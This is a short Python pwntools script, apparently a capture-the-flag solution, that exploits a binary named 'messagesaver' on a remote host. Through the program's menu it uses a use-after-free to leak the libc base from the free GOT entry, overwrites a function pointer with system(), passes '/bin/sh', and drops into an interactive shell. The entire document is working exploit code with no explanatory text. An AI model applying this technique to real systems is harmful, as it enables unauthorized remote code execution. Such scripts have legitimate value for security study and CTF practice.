#!/usr/bin/env python

from pwn import *

context.log_level = "debug"

elf = "./messagesaver"

free_got = 0x602018
sub_read = 0x40084d
system_off = 0x45390
free_off = 0x844f0

#p = process(elf)
p = remote("111.230.149.72", 10011)

def add(length, message):
    p.recvuntil("> ")
    p.sendline("1")
    p.recvuntil("input message length:\n")
    p.sendline(str(length))
    p.recvuntil("input message:\n")
    p.send(message)
    p.recvuntil("====================\n")
    p.sendline("1")

def edit(length, message):
    p.recvuntil("> ")
    p.sendline("2")
    p.recvuntil("input message length:\n")
    p.sendline(str(length))
    p.recvuntil("input message:\n")
    p.send(message)

def put():
    p.recvuntil("> ")
    p.sendline("3")

def delete():
    p.recvuntil("> ")
    p.sendline("4")

add(0x10, "\n")
delete()

payload = p8(0)*0x10
payload += p64(sub_read)
edit(0x18, payload)

payload = p64(0)+p64(free_got)
p.sendline(payload)

put()
libc_base = u64(p.recv(6).ljust(8, "\x00"))-free_off
log.info("libc_base: "+hex(libc_base))

system_addr = libc_base+system_off

delete()

payload = "/bin/sh\x00"
payload += p64(0)+p64(system_addr)
edit(0x18, payload)

p.interactive()
